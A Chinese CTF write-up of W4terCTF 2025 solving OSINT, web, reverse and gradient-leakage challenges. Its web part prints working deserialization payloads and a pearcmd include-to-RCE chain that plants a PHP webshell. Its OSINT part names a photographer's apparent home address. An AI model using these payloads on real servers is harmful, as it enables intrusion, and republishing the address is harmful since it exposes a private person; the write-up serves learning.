---
title: W4terCTF 2025
date: 2025-05-13 19:33:14
tags: CTF
excerpt: 拼尽全力。
---



# OSINT

非常好玩的图寻题，但充分暴露出地理常识为0。幸运地抢了个三血。

## 海的那边是

POV：**羡慕出题人在海边度假**




![alt text](微信图片_20250503193131.jpg)


因为对出题人在群里说正在San Diego的印象比较深，马上定位图片位置大概就是La Jolla。

### task1

保存图片后查看图片属性


![alt text](image-20250503175742770.png)
ans：<u>**20250427**</u>



### task3 


![alt text](微信图片_20250503193419.png)

先定位到建筑的位置会更方便做剩下几问，于是打开谷歌识图：
发现了一模一样的建筑，连水管和猫头鹰装饰都一模一样！


![alt text](微信图片_20250503193140.png)

打开作者主页：

![微信图片_20250503193150](微信图片_20250503193150.png)



其他图片显示的内容也佐证了这一点，<u>在海边</u>。

本来想在谷歌地图里面暴走一圈找到这个建筑来着，但是太暴力了点。

又想去其他社交平台找这个作者，但是没什么发现。不过意外发现了这个作者的住址：***Jeremiah Regner, located at 9505 Gold Coast Dr Apt 98, San Diego, CA*.**

![微信图片_20250503193205](微信图片_20250503193205.png)

地点极其符合——在谷歌地图定位这个地址：

![微信图片_20250503193217](微信图片_20250503193217.jpg)

先在作者家附近的海岸找，果然找到了：

![微信图片_20250503193223](微信图片_20250503193223.png)

在地图上走啊走，就走到了：

![微信图片_20250503194002](微信图片_20250503194002.png)

ans：<u>**Hubbs Hall**</u>



### task2

谷歌地图上是有充电头信息的，但是找不到，绷🤣

不过好在有很多充电桩分布的网站提供信息。

![微信图片_20250503194142](微信图片_20250503194142.png)

ans：<u>**J1772**</u>



### task4

ez，随便找个出发点，最后都要坐30路公交。

![微信图片_20250503194610](微信图片_20250503194610.png)

ans：<u>**30**</u>



### task5

Hubbs Hall旁边的潮汐监测点在 Sccripps Pier，其站点编号是9410230。

找到相关数据网站就有了。

![微信图片_20250503195311](微信图片_20250503195311.png)

图中数据即是5月7号的海浪预测峰值

p.s.：因为这里死活填不对，拷打了下出题人，出题人说可以ft转cm可以先舍去小数部分再计算，4ft算出来四舍五入是122，但是正确答案是121🥲。（原来保留整数就真的只是保留整数（部分）。。）

以及不同网站的预测数据不太一样，有点搞......

ans：<u>**122 or 143**</u>

### task6

不学地理是这样的，☝️🤓可以算出海浪峰值周期40000多秒。

找到现成的数据就好了：

![微信图片_20250503200140](微信图片_20250503200140.png)

ans：<u>**10**</u>



### flag

![微信图片_20250503200530](微信图片_20250503200530.png)

```
Flag: W4terCTF{Sc1ENc3_UndOUBTEd1Y_IMMorT4I_5EA_Un4R9U481y_IlLumln4tlnG}
```



# WEB

## Core Dump Error（签到题）

半夜误打误撞做出来了。

原来视频里面的issue只是被close而不是被delete了 hhh。

只要找到相关issue的POC链然后改一下exec执行的命令就好了

```json
{
    "objects": {
      "1": {
        "type": "frame",
        "attrs": {
          "f_lineno": "11",
          "f_locals": "12",
          "f_code": "13",
          "f_globals": "14",
          "f_back": "15"
        }
      },
      "11": {
        "type": "int",
        "value": 1
      },
      "12": {
        "type": "dict",
        "value": {}
      },
      "13": {
        "type": "code",
        "attrs": {
          "co_filename": "131",
          "co_name": "132"
        }
      },
      "14": {
        "type": "dict",
        "value": {
          "141": "143",
          "142": "144"
        }
      },
      "15": {
        "type": "NoneType"
      },
      "131": {
        "type": "str",
        "value": "filename"
      },
      "132": {
        "type": "str",
        "value": "name"
      },
      "141": {
        "type": "str",
        "value": "__name__"
      },
      "142": {
        "type": "str",
        "value": "__loader__"
      },
      "143": {
        "type": "str",
        "value": "print(open('/tmp/flag').read())"
      },
      "144": {
        "type": "EvilLoader",
        "attrs": {
          "get_source": "1441"
        }
      },
      "1441": {
        "type": "builtin_function",
        "value": "exec"
      }
    },
    "threads": {
      "0": {
        "frame": "1"
      }
    },
    "current_thread": "0",
    "files": {},
    "metadata": {
      "version": "0.4.0"
    }
  }

```

![微信图片_20250505110938](微信图片_20250505110938.png)

```
Flag: W4terCTF{c0N9ra7u1ATIonS_0N_hacK1nG_A_pRoGraM_foR_TH3_1IrSt_t1Me}
```



## Happy PHP

### part1

阅读php代码，梳理逻辑如下：

- 如果url中传递了参数  gogogo ，该对象就会被反序列化。
- 反序列化的对象会触发魔术方法__wakeup()，并返回gogogo的结果。
- 如果触发phpis 类的__invoke()方法，则执行fun1(fun2())，并通过eval()函数执行代码。返回结果 == 'Yelia'的话，就调用 what->saying。

- 要调用piece1->here()，必须让 $flag 的 MD5 值等于 md5(666)。

- 如果两个不同的变量 $sy 和 $su 的 MD5 和 SHA1相等，就能echo fl491.txt。

通过构造反序列化的POP链，获得payload

```php
<?php
class phpis {
    public $what;
    public $fun1;
    public $fun2;
    function __invoke() { 
        if (preg_match('/^[a-z0-9]+$/', $this->fun1) ){
        if(preg_match('/^[a-z0-9]+$/', $this->fun2)) {
                $flag = eval("return $this->fun1($this->fun2());");
                if(intval($flag) == 'Yelia'){
                    $this->what->saying();
                } else {
                    die("nonono ,please try again !!");
                }            
            }
        }
    }
}

class thebest {
    public $gogogo;
}

class language {
    public $v1;
    public $piece1;
}

class right {
    public $sy;
    public $su;
}


$right = new right();
$right->sy = [1];
$right->su = [2]; 

$lang = new language();
$lang->v1 = "flag=" . md5(666);
$lang->piece1 = $right;

$phpis = new phpis();
$phpis->what = $lang;
$phpis->fun1 = "strlen"; 
$phpis->fun2 = "strrev";

$best = new thebest();
$best->gogogo = $phpis;

$payload = serialize($best);
echo "payload：\n\n";
echo urlencode($payload) . "\n";
?>

//payload: ?gogogo=O%3A7%3A%22thebest%22%3A1%3A%7Bs%3A6%3A%22gogogo%22%3BO%3A5%3A%22phpis%22%3A3%3A%7Bs%3A4%3A%22what%22%3BO%3A8%3A%22language%22%3A2%3A%7Bs%3A2%3A%22v1%22%3Bs%3A37%3A%22flag%3Dfae0b27c451c728867a567e8c1bb4e53%22%3Bs%3A6%3A%22piece1%22%3BO%3A5%3A%22right%22%3A2%3A%7Bs%3A2%3A%22sy%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A2%3A%22su%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D%7D%7Ds%3A4%3A%22fun1%22%3Bs%3A6%3A%22strlen%22%3Bs%3A4%3A%22fun2%22%3Bs%3A6%3A%22strrev%22%3B%7D%7D    
    
```

![微信图片_20250503204222](微信图片_20250503204222.png)

```flag
Flag_piece_1: W4terCTF{i5_pHp
```

### part2

进到 /1nCLud3.php 目录下

根据源码，需要构造参数file，同时又要绕过正则匹配。试了很多种绕过都不太行，虽然$_SERVER['QUERY_STRING']在匹配的时候不会进行url解码，但是同样include打开文件的时候也不会进行url解码，试图构造用url编码方式绕过正则匹配的方式就行不通。

根据提示：register_argc_argv=On，找到博客[register_argc_argv与include to RCE的巧妙组合 - Longlone's Blog](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合/)

和这道题的思路非常像，所以仿照博客中的解题思路，利用pearcmd执行rce：

“当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在registerargcargv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER['argv']来执行pear命令。”

```payload
?file=pearcmd&+config-create+/<?phpsystem($_GET['cmd']);?>+/tmp/evil.php
```

因为浏览器会将< ? > 转义，所以通过burpsuite抓包后再GET传参

![微信图片_20250504135809](微信图片_20250504135809.png)



这便拿到了cmd的控制权，随后查找剩下的flag

通过include打开evil.php继续利用cmd

```payload
?file=/tmp/evil&cmd=ls /tmp
```

![微信图片_20250504140529](微信图片_20250504140529.png)



再配合通配符绕过一下

```payload
?file=/tmp/evil&cmd=cat /tmp/f*lag2.txt
```

![微信图片_20250504140829](微信图片_20250504140829.png)

```
Flag_piece2: _The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!}
```

```
Flag: W4terCTF{i5_pHp_The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!}
```



##  Front End

密码的web题

![微信图片_20250504155416](微信图片_20250504155416.png)



base64编码

![微信图片_20250504155524](微信图片_20250504155524.png)

![微信图片_20250504155559](微信图片_20250504155559.png)



打开 /hint.html

![微信图片_20250504155659](微信图片_20250504155659.png)



看到注释——JavaScript 混淆表达式。在控制台运行一下，得到encode.php

![微信图片_20250504155944](微信图片_20250504155944.png)



来到密码的部分

根据

![微信图片_20250504160243](微信图片_20250504160243.png)

这一部分的判断逻辑，如果变量 rand 等于0 就输出加密后的内容。

根据 rand 的定义，传递参数 r = 1537101982

得到了调用两次encrypt的加密结果：

```
Encrypted: 253430495677694834376a30334d7643476e42466b36457a5672714649736d326b626d4c33666f4b6e546c7a324c583857396331543079 
Encrypted: 4f59355430674b38334631497243574c6b58394d46486d706d4249384b5a3230344d4c776d476a5431585a64774f5852747a507779
```

而在php语言中，mt_rand()生成随机数的方式一般是根据时间戳，如果固定了种子，调用mt_srand(seed)后，mt_rand()生成的随机数序列是不变的。可以得出第一次调用 mt_rand()得到的值等于r，即 1537101982。

网上查阅资料可知，可从生成的随机数序列倒推种子。运行脚本后得到：

![微信图片_20250504160818](微信图片_20250504160818.png)




得出了几个满足条件的种子，正向地用这些种子生成随机数序列

```php
<?php

$seeds = [997887998, 1741048634, 2753486577, 3026673652, 4268323880];

foreach ($seeds as $seed) {
    echo "Seed: $seed\n";
    mt_srand($seed);  
    
    $rand1 = mt_rand();  
    $rand2 = mt_rand();  
    $rand3 = mt_rand();  
    echo "rand1: $rand1, rand2: $rand2, rand3: $rand3\n";
    $seed_enc = $rand2 + $rand3 * 1000000000;  //得到加密中需要使用的种子
        
    echo "Seed Encrypted: $seed_enc\n";
    }
    echo "\n";  
?>

//Seed Encrypted: 656981344086716842
//Seed Encrypted: 139121407568507466
//Seed Encrypted: 1604674039149147684
//Seed Encrypted: 1782694585991376243
//Seed Encrypted: 1520982203885732553
```

最后再根据原文的加密逻辑倒推flag：

```php
<?php

$chars     = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@!";
$chars_map = array_flip(str_split($chars));

function decrypt($encrypted_text, $seed, $chars, $chars_map) {

    //$encrypted_text = urldecode($encrypted_text);//url解码

    $ch  = $encrypted_text[0];
    $nh  = strpos($chars, $ch);//首字符的位置确定rand()产生的随机数
    echo "nh: {$nh}\n";
    
    $encrypted_body = substr($encrypted_text, 1);//实际加密数据
	
    //根据加密逻辑倒推
    $mdKey_full = md5((string)$seed . $ch);
    $start      = $nh % 8;
    $length     = $start + 7;           
    $mdKey      = substr($mdKey_full, $start, $length);

    $k    = 0;
    $tmp  = '';
    $keyL = strlen($mdKey);
    for ($i = 0; $i < strlen($encrypted_body); $i++) {
        $c       = $encrypted_body[$i];
        $k       = $k % $keyL;
        $ci      = $chars_map[$c];
        // j = (ci - nh - ord(mdKey[k])) mod 64
        $j       = ($ci - $nh - ord($mdKey[$k]) + 64*2) % 64;
        $tmp    .= $chars[$j];
        $k++;
    }

    return $tmp;
}

$seed    = '1782694585991376243';//手动更换计算得到的seed，wp为正确的seed
$cipher1 = "OY5T0gK83F1IrCWLkX9MFHmpmBI8KZ204MLwmGjT1XZdwOXRtzPwy";
//这里我已经先将加密的内容从转为转为了字节，并恢复了一些字符即url解码。

$encoded = decrypt($cipher1, $seed, $chars, $chars_map);
$flag    = base64_decode($encoded);

echo "[+] Decrypted flag: {$flag}\n";
?>

```

可成功解密flag

![image-20250504162719128](image-20250504162719128.png)

```
W4terCTF{A1b_fROn7EnD_kEep5_8rEwinG}
```



# REVERSE

## 网站管理员的登录密码

根据提示需要找到**成功登录**的密码

打开.pcapng，定位POST请求下的login流量包。

![微信图片_20250504163434](微信图片_20250504163434.png)



状态显示登陆成功，接下来只需要破解这段密码即可。

![image-20250504163921288](image-20250504163921288.png)



找到了密码的加密方式，用一个密钥和一个初始向量，AES加密

对应地写个解密脚本

```python 
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

# 加密密钥和初始向量
key = bytes.fromhex("4ede70b7e44ffcc7cd912685defd05b1")
iv = bytes.fromhex("c63b909a63ecdbbe813181e3c4734d87")

# 加密后的密文（Base64 编码）
encrypted_text = "gBjV3cE/UXEm7fXGXbQ4O7bXJEwi0y68SGNjkhuV2RW43lkkKm+xNQzpJDlfgCFOoAvOd0Ff1bg3Je4zbAAEdWpe8DmRdf5wH2F9vhAuDpg="

# 将 Base64 编码的密文解码为字节
encrypted_bytes = base64.b64decode(encrypted_text)

# 创建 AES 解密器
cipher = AES.new(key, AES.MODE_CBC, iv)

# 解密并去除填充
try:
    decrypted_bytes = cipher.decrypt(encrypted_bytes)
    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode('utf-8')
    print("解密后的文本:", decrypted_text)
except ValueError as e:
    print("解密失败:", e)
```

![image-20250504164403519](image-20250504164403519.png)

```
Flag: W4terCTF{Fr0N73Nd!_17'5_my_5ymM3trlC_3ncrYpt1On!!!!!}
```



## 和谐小APP

参考了这篇博客：[鸿蒙逆向 - SHCTF - Android？Harmony！题解 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1973595-1-1.html)

先将.hap文件改为.zip后缀解压

<img src="image-20250504164803915.png" alt="image-20250504164803915" style="zoom:50%;" />


找到.abc文件，用abc反编译工具打开。在 entryability 下定位到 W4terCTF：

![image-20250504165220376](image-20250504165220376.png)

这段反编译的结果大致是说，如果 trim == "flag"，trim2 =="W4terCTF{...}"，就会触发彩蛋。而彩蛋是从“libentry.so”中导入的guessWhat函数在 输入是trim2，种子是20250428 的条件下生成的。

```
orz = import { default as orz } from "@normalized:Y&&&libentry.so&";
obj4.message = orz.guessWhat(trim2, 20250428);
```

那么就定位到 libentry.so 文件。用 IDA 打开，定位到guesswhat函数

![image-20250504170855720](image-20250504170855720.png)

找到了函数的实际入口地址，F5一下，反编译代码主要逻辑如下：

```js
napi_get_value_string_utf8(a1, v18, s1, 128LL, v13);//字符串
napi_get_value_double(a1, *((_QWORD *)&v18 + 1), &v12);//数字
                      
//对传入的两个参数进行一些变换
v4 = 5 * (int)v12;
  v5 = 15 * (int)v12;
  v6 = 20 * (int)v12;
  v7 = 10 * (int)v12;
  for ( i = 0LL; ; i += 20LL )
  {
    *(_DWORD *)((char *)s1 + i) ^= v3;
    if ( i > 0x77 )
      break;
    *(_DWORD *)((char *)s1 + i + 5) ^= v4 + v3;
    *(_DWORD *)((char *)s1 + i + 10) ^= v7 + v3;
    *(_DWORD *)((char *)s1 + i + 15) ^= v5 + v3;
    v3 += v6;
  }

//最后判断变换后的变量是否与target相等
if (!bcmp(s1, &target, 0x80))
    v8 = &unk_910;  // 成功提示
else
    v8 = &unk_91C;  // 失败提示
```

所以下面就是要去找到 target

![image-20250504172003259](image-20250504172003259.png)

提取出target的所有字节，并基于上面的变换逻辑恢复出flag即可

```python
import struct

target_bytes = bytes([
    0x57, 0x34, 0x74, 0x65, 0x72, 0x6F, 0xA8, 0x4E, 0x7D, 0x57,
    0x10, 0xBD, 0x5F, 0x53, 0x79, 0xCB, 0xA1, 0x68, 0x4D, 0x44,
    0xE2, 0x95, 0x62, 0x55, 0x53, 0x83, 0xAF, 0x63, 0x53, 0x45,
    0x57, 0xA8, 0x7C, 0x4D, 0x76, 0x71, 0xBA, 0x67, 0x45, 0x55,
    0x47, 0x93, 0x74, 0x6F, 0x55, 0xE2, 0xE8, 0x04, 0x06, 0x70,
    0xC8, 0xED, 0x6F, 0x0D, 0x45, 0x99, 0xD5, 0x62, 0x42, 0x00,
    0x10, 0xD2, 0x6B, 0x48, 0x00, 0x3C, 0xCE, 0x74, 0x4E, 0x00,
    0x68, 0xCA, 0x7D, 0x54, 0x00, 0x94, 0xC6, 0x86, 0x5A, 0x00,
    0xC0, 0xC2, 0x8F, 0x60, 0x00, 0xEC, 0xBE, 0x98, 0x66, 0x00,
    0x18, 0xBB, 0xA1, 0x6C, 0x00, 0x44, 0xB7, 0xAA, 0x72, 0x00,
    0x70, 0xB3, 0xB3, 0x78, 0x00, 0x9C, 0xAF, 0xBC, 0x7E, 0x00,
    0xC8, 0xAB, 0xC5, 0x84, 0x00, 0xF4, 0xA7, 0xCE, 0x8A, 0x00,
    0x20, 0xA4, 0xD7, 0x90, 0x00, 0x00, 0x00, 0x00
])

v11 = 20250428  #传入的数值参数
v2 = 0
v3 = 5 * v11
v4 = 15 * v11
v5 = 20 * v11
v6 = 10 * v11

s1 = bytearray(target_bytes)

for i in range(0, 0x80, 20):
    if i + 15 + 4 > len(s1): 
        break

    def xor_dword(offset, value):
        pos = i + offset
        val = struct.unpack_from('<I', s1, pos)[0]  
        val ^= value
        struct.pack_into('<I', s1, pos, val)

    xor_dword(0, v2)
    xor_dword(5, v3 + v2)
    xor_dword(10, v6 + v2)
    xor_dword(15, v4 + v2)

    v2 += v5


print(f"解密后的字节数据：\n{s1}")

# 尝试以不同的编码解码
try:
    result = s1.rstrip(b'\x00').decode('utf-8')
    print(f"[+] 解密成功，flag/原文为：\n{result}")
except UnicodeDecodeError:
    print("[-] 解密失败，UTF-8 解码出错。尝试其他编码方式。")
    try:
        result = s1.decode('latin1')
        print(f"[+] 使用 latin1 编码解密成功，flag/原文为：\n{result}")
    except UnicodeDecodeError:
        print("[-] 解密失败，latin1 解码出错。")

```

![image-20250504172338683](image-20250504172338683.png)

```
Flag: W4terCTF{WHEN_yOUr_DReAMS_COME_AIivE_YoU'r3_Un5T0pp461E}
```



# AI

## Gradient

AI题先交给AI做，后面一定好好上创新实践训练课😭😭😭

特别感谢出题人R1ck，因为深度学习的知识尚浅薄，靠R1ck提点才有今天的成功，也算是给这次比赛画上一个圆满的句号了。

根据题目，找到参考的论文以及源代码。

```python
# 核心代码
def deep_leakage_from_gradients(model, origin_grad): 
  dummy_data = torch.randn(origin_data.size())
  dummy_label =  torch.randn(dummy_label.size())
  optimizer = torch.optim.LBFGS([dummy_data, dummy_label] )

  for iters in range(300):
    def closure():
      optimizer.zero_grad()
      dummy_pred = model(dummy_data) 
      dummy_loss = criterion(dummy_pred, F.softmax(dummy_label, dim=-1)) 
      dummy_grad = grad(dummy_loss, model.parameters(), create_graph=True)

      grad_diff = sum(((dummy_grad - origin_grad) ** 2).sum() \
        for dummy_g, origin_g in zip(dummy_grad, origin_grad))
      
      grad_diff.backward()
      return grad_diff
    
    optimizer.step(closure)
    
  return  dummy_data, dummy_label
```

恢复的方法大意是指：

- 先随机初始化一个虚假的原始图像dummy_data和原始标签dummy_label
- 用LBFGS优化器来优化dummy_data和dummy_label，让他们产生的梯度和原始的梯度越来越接近
- 然后对dummy_data在神经网络上前向传播，用dummy_label作为目标衡量损失 loss
- 计算dummy_data的梯度
- 衡量dummy_grad和origin_grad的差异，然后对dummy_data和dummy_label反向传播来优化。
- 最后返回输出和标签，还原原始样本。

现有的文件是 model.pth 和一些 梯度文件 .grad

```python
import torch
import torch.nn as nn
# 占位模型类，用于加载（结构未知时也能绕过）
class R1ckNet(nn.Module):
    def __init__(self):
        super().__init__()

# 加入到 safe_globals（新 PyTorch 安全机制）
from torch.serialization import add_safe_globals
add_safe_globals({'R1ckNet': R1ckNet})
 
 
pthfile = r'E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\model.pth'            #.pth文件的路径
model = torch.load(pthfile, map_location='cpu', weights_only=False)
state_dict = model.state_dict()   # 从模型对象中提取参数字典
for k, v in state_dict.items():
    print(k, v.shape)

#如果直接使用 torch.load 打印模型信息的话，会因为未知R1ckNet报错。
#所以实例化一个类占位。
```

通过torch.load打印模型信息，输出了每个卷积层的权重以及全连接层的权重。

- 卷积层权重：卷积核数量、输入通道数、卷积核大小。
- 全连接层权重：输入与输出之间的连接。

```python
# 输出如下
'''
body.0.weight torch.Size([12, 3, 5, 5])
body.0.bias torch.Size([12])
body.2.weight torch.Size([12, 12, 5, 5])
body.2.bias torch.Size([12])
body.4.weight torch.Size([12, 12, 5, 5])
body.4.bias torch.Size([12])
body.6.weight torch.Size([16, 12, 3, 3])
body.6.bias torch.Size([16])
fc.0.weight torch.Size([100, 1024])
fc.0.bias torch.Size([100])
'''
```

拷打出题人后，发现对 .pth 文件挖掘不充分，进一步打印自定义类的超参数，得到一个hint

```python
import argparse
import torch
import torch.nn as nn
import inspect

# 如果你的模型类定义在某个模块里，请确保能 import 到它
# 这里给出一个占位定义，实际加载时会使用 pickle 里的类定义
class R1ckNet(nn.Module):
    def __init__(self, in_channels=3, conv1_out=12, conv2_out=12, conv3_out=12, conv4_out=16, fc_in=1024, num_classes=100):
        super().__init__()
        # 如果模型里定义了 hparams，它会在实例上
        try:
            self.hparams = {
                "in_channels": in_channels,
                "conv1_out": conv1_out,
                "conv2_out": conv2_out,
                "conv3_out": conv3_out,
                "conv4_out": conv4_out,
                "fc_in": fc_in,
                "num_classes": num_classes,
            }
        except Exception:
            pass
        # 构建网络结构（可省略，仅为完整定义）
        self.body = nn.Sequential(
            nn.Conv2d(in_channels, conv1_out, 5, stride=2, padding=2), nn.Sigmoid(),
            nn.Conv2d(conv1_out, conv2_out, 5, stride=2, padding=2), nn.Sigmoid(),
            nn.Conv2d(conv2_out, conv3_out, 5, stride=1, padding=2), nn.Sigmoid(),
            nn.Conv2d(conv3_out, conv4_out, 3, stride=1, padding=1), nn.Sigmoid(),
            nn.Flatten()
        )
        self.fc = nn.Linear(fc_in, num_classes)

    def forward(self, x):
        x = self.body(x)
        x = x.view(x.size(0), -1)
        return self.fc(x)

    def __repr__(self):
        # 尝试打印 hparams，否则退回默认
        if hasattr(self, 'hparams'):
            params = ", ".join(f"{k}={v}" for k, v in self.hparams.items())
            return f"{self.__class__.__name__}({params})"
        else:
            return super().__repr__()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--pth', type=str, required=True,
                        help='path to .pth file (whole-model or state_dict)')
    args = parser.parse_args()

    # 载入 .pth
    loaded = torch.load(args.pth, map_location='cpu',weights_only=False)

    # 判定类型
    if isinstance(loaded, dict):
        print("Detected state_dict. Instantiating R1ckNet and loading state_dict.")
        model = R1ckNet()
        # 支持 checkpoint dict 包含 'model_state_dict'
        sd = loaded.get('model_state_dict', loaded)
        model.load_state_dict(sd)
    else:
        print("Detected full-model object. Using it directly.")
        model = loaded

    model.eval()

    # 1) 打印 repr（调用 __repr__）
    print("\n=== Model repr() ===")
    print(model)

    # 2) 打印构造函数签名
    sig = inspect.signature(model.__class__.__init__)
    print("\n=== Constructor signature ===")
    print(sig)

    # 3) 如果有 hparams
    if hasattr(model, 'hparams'):
        print("\n=== model.hparams ===")
        for k, v in model.hparams.items():
            print(f"  {k} = {v}")
    else:
        print("\nNo model.hparams attribute. Inspecting instance __dict__ for hyperparam-like entries...")
        for k, v in vars(model).items():
            # 过滤模块和参数
            if not isinstance(v, (nn.Module, nn.Parameter)) and not k.startswith('_'):
                print(f"  {k} = {v}")

    # 4) 列出所有参数名和形状
    print("\n=== model.named_parameters() ===")
    for name, param in model.named_parameters():
        print(f"{name:30s} | shape: {tuple(param.shape)}")


if __name__ == '__main__':
    main()

    
# cmd line: python info.py --pth "your.pth"
```

![image-20250504203337339](image-20250504203337339.png)

```
hint: 7h3_84ck6r0und_0f_7h3_ch4r4c73r_1m463_15_wh173😝
字符背景是白色的。
```

那么结合上述的神经网络的信息，就能导入梯度迭代恢复了。

```python
# -*- coding: utf-8 -*-
# r1cknet_grad_attack.py
# 单独训练某个样本
import argparse
import matplotlib.pyplot as plt
import torch
import torch.nn.functional as F
from model import R1ckNet
from utils import label_to_onehot, cross_entropy_for_onehot
import os

parser = argparse.ArgumentParser(description='Deep Leakage from Gradients using R1ckNet.')
parser.add_argument('--grad', type=str, required=True, help='Path to the .grad file')
parser.add_argument('--out', type=str, default=None, help='Path to save recovered image')
args = parser.parse_args()


device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
print("Running on", device)

# 1. 加载原始梯度
with open(args.grad, 'rb') as f:
    origin_grad = torch.load(f)

# 2. 初始化模型并加载已有权重
#net = R1ckNet().to(device)
#这个也可以不用注释掉，就是和后面导入模型有点重复

# 加载模型的state_dict
net = torch.load(r"E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\model.pth", 
                 map_location=device,weights_only=False)

net.eval()

# 3. 初始化 dummy 数据和标签
dummy_data = torch.ones((1, 3, 32, 32), device=device, requires_grad=True)
# 之前迭代损失很高就是因为没读懂提示，原来提示的作用是为了让初始化图像时尽可能接近恢复出的图像，这样就能降低损失。在比较少的迭代次数也能有效恢复。
# 图片背景是白色，初始化为全白图像，即采用 torch.ones。
# 之前一直模仿论文代码写的是 torch.rands，训练恢复的效果就很差。
dummy_label = torch.randn((1, 100), device=device, requires_grad=True)

# 使用 LBFGS 优化器
optimizer = torch.optim.LBFGS([dummy_data, dummy_label])
history = []

# 4. 迭代优化以恢复图像和标签
for it in range(300):
    def closure():
        optimizer.zero_grad()
        # 进行前向传播获取预测结果
        pred = net(dummy_data)
        #print(f"Prediction shape: {pred.shape}")  # 打印预测结果的形状

        # 使用 softmax 转换标签为概率分布
        soft_label = F.softmax(dummy_label, dim=-1)

        # 计算交叉熵损失
        loss = cross_entropy_for_onehot(pred, soft_label)

        # 计算损失对模型参数的梯度
        grads = torch.autograd.grad(loss, net.parameters(), create_graph=True)

        # 计算恢复梯度与原始梯度之间的差异
        diff = sum(((g_rec - g_orig) ** 2).sum() for g_rec, g_orig in zip(grads, origin_grad))
        diff.backward()  # 反向传播计算差异的梯度

        return diff

    optimizer.step(closure)

    if it % 10 == 0:
        loss_val = closure().item()
        print(f"Iter {it:3d} | Loss: {loss_val:.4f}")
        history.append(dummy_data[0].detach().cpu())

# 5. 可视化中间恢复图像
plt.figure(figsize=(12, 8))
for i, img in enumerate(history[:30]):
    plt.subplot(3, 10, i + 1)
    plt.imshow(img.permute(1, 2, 0).clip(0, 1))
    plt.title(f"it={i * 10}")
    plt.axis('off')
plt.tight_layout()

# 自动命名图像文件
if args.out:
    plt.savefig(args.out)
else:
    grad_filename = os.path.splitext(os.path.basename(args.grad))[0]  # 提取不带扩展名的文件名
    out_path = f"{grad_filename}.png"
    plt.savefig(out_path)
    print(f"Image saved to {out_path}")


# 6. 输出恢复标签
with torch.no_grad():
    final_probs = F.softmax(dummy_label, dim=-1)
    recovered_class = torch.argmax(final_probs, dim=-1).item()
print("Recovered class label:", recovered_class)
# 这个标签有大用，之前看到输出结果一直以为是迭代过程中一个比较突出的数值，还是学得太粗略了。
```

```python
# model.py
import torch.nn as nn

class R1ckNet(nn.Module):
    def __init__(self, in_channels=3, conv1_out=12, conv2_out=12, conv3_out=12,
                 conv4_out=16, fc_in=1024, num_classes=100):
        super().__init__()
        self.body = nn.Sequential(
            nn.Conv2d(in_channels, conv1_out, 5, stride=2, padding=2),
            nn.Sigmoid(),
            nn.Conv2d(conv1_out, conv2_out, 5, stride=2, padding=2),
            nn.Sigmoid(),
            nn.Conv2d(conv2_out, conv3_out, 5, stride=1, padding=2),
            nn.Sigmoid(),
            nn.Conv2d(conv3_out, conv4_out, 3, stride=1, padding=1),
            nn.Sigmoid(),
            nn.Flatten()
        )
        self.fc = nn.Linear(fc_in, num_classes)

    def forward(self, x):
        x = self.body(x)
        x = x.view(x.size(0),-1)
        # 展平这一步很重要，规范张量的形状以和权重矩阵的形状相匹配。感觉自己学习代码还是挺粗线条的💦💦💦
        return self.fc(x)

```

```python 
# utils.py

import torch
import torch.nn.functional as F

# 整数形式的分类标签转换为 One-Hot 编码。
# dummy_label是可导的，转换one-hot方便计算和预测结果之间的损失
def label_to_onehot(target, num_classes=100):
    target = torch.unsqueeze(target, 1)  # [B,1]
    onehot = torch.zeros(target.size(0), num_classes, device=target.device)
    onehot.scatter_(1, target, 1)
    return onehot

# 计算预测结果与 one-hot 标签之间的交叉熵损失。
def cross_entropy_for_onehot(pred, target):
    return torch.mean(torch.sum(- target * F.log_softmax(pred, dim=-1), dim=1))

```

```python
# -*- coding: utf-8 -*-
# batch.py 批量训练梯度
import os
import torch
import torch.nn.functional as F
import matplotlib.pyplot as plt
from model import R1ckNet
from utils import cross_entropy_for_onehot
from tqdm import tqdm  # 用于显示进度条

# 配置参数
GRAD_DIR = r"E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\grads_origin"
MODEL_PATH = r"E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\model.pth"
OUT_DIR = r"E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\outputs1"
os.makedirs(OUT_DIR, exist_ok=True)

# 设备选择
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
print("Running on", device)

# 加载模型
net = torch.load(MODEL_PATH, map_location=device,weights_only=False)
net.eval()

# 遍历所有 .grad 文件
for grad_file in sorted(os.listdir(GRAD_DIR)):
    if not grad_file.endswith(".grad"):
        continue

    grad_path = os.path.join(GRAD_DIR, grad_file)
    out_name = os.path.splitext(grad_file)[0] + ".png"
    out_path = os.path.join(OUT_DIR, out_name)

    # 加载原始梯度
    with open(grad_path, 'rb') as f:
        origin_grad = torch.load(f)

    # 初始化 dummy 数据和标签
    dummy_data = torch.ones((1, 3, 32, 32), device=device, requires_grad=True)
    dummy_label = torch.randn((1, 100), device=device, requires_grad=True)

    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])
    history = []

    # 迭代优化
    for it in range(100):
        def closure():
            optimizer.zero_grad()
            pred = net(dummy_data)
            soft_label = F.softmax(dummy_label, dim=-1)
            loss = cross_entropy_for_onehot(pred, soft_label)
            grads = torch.autograd.grad(loss, net.parameters(), create_graph=True)
            diff = sum(((g_rec - g_orig) ** 2).sum() for g_rec, g_orig in zip(grads, origin_grad))
            diff.backward()
            return diff

        optimizer.step(closure)

        if it %10 == 0:
            loss_val = closure().item()
            print(f"Iter {it:3d} | Loss: {loss_val:.4f}")
            history.append(dummy_data[0].detach().cpu())

